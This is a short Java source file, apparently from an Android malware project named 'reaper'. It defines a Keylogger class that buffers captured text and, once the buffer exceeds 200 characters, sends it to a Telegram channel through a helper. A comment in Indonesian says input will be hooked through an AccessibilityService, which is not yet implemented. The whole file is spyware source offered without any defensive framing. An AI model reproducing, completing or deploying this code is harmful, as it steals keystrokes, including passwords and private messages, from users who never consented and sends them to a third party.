package com.mood.reaper;

import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;
import java.util.ArrayList;

public class Keylogger {
    private static StringBuilder buffer = new StringBuilder();
    private static String lastSent = "";

    public static void logKey(String text) {
        buffer.append(text).append(" ");
        if (buffer.length() > 200) {
            sendLog();
        }
    }

    private static void sendLog() {
        String log = buffer.toString();
        if (!log.equals(lastSent)) {
            Utils.sendToTelegram("⌨️ Keylog: " + log);
            lastSent = log;
            buffer = new StringBuilder();
        }
    }

    // Hook ke EditText via AccessibilityService (implementasi lebih lanjut)
}